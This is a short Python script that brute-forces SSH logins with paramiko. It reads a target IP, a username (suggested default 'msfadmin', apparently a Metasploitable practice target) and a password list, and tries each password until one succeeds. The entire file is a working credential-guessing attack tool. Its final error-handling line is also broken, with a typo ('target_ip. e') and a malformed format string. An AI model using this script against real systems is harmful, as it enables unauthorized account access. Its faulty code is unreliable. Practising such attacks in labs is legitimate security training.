import paramiko
from paramiko.ssh_exception import AuthenticationException

ssh = paramiko.SSHClient()

ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())

target_ip = input("Enter the target ip address here: ")
target_user = input("Enter the username targeted here (msfadmin): ")
# get the txt file with passwords
password_file = input("Enter the name of the password file (e.g., passwords.txt): ")
with open(password_file, 'r') as file:
    # read each line, strips the newline character, and creates the list
    passwords = [line.strip() for line in file.readlines()]



for password_attempt in passwords:
    try:

        ssh.connect(hostname= target_ip, username= target_user, password=password_attempt)
        print("\nThe password is: {0}".format(password_attempt))
        ssh.close()
        break 

    except AuthenticationException:
        print("{0} did not work".format(password_attempt))

    except Exception as e:
        # this catches other potential errors 
        print("Error connecting to {0}: {}".format(target_ip. e))
